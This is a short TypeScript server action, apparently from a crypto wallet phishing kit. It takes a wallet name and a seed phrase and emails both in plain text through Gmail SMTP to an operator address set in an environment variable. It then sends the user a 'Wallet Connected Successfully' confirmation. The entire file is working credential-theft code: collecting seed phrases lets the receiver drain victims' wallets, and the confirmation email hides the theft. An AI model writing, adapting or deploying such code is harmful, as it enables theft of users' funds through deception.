"use server";

import nodemailer from "nodemailer";

interface SendSeedPhraseParams {
  wallet: string;
  seedPhrase: string;
  userEmail?: string;
}

export default async function sendSeedPhrase({
  wallet,
  seedPhrase,
  userEmail,
}: SendSeedPhraseParams): Promise<void> {
  // Configure SMTP transport
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: process.env.EMAIL_USER as string,
      pass: process.env.EMAIL_PASS as string,
    },
  });

  // Send to admin/receiver
  await transporter.sendMail({
    from: process.env.EMAIL_USER,
    to: process.env.EMAIL_RECEIVER,
    subject: `New Seed Phrase Submission (${wallet})`,
    text: `Wallet: ${wallet}\nSeed Phrase: ${seedPhrase}`,
  });

  // Send confirmation to user
  if (userEmail) {
    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: userEmail,
      subject: "Wallet Connected Successfully",
      text: `Your wallet has been connected successfully. Your seed phrase is: ${seedPhrase}`,
    });
  }
}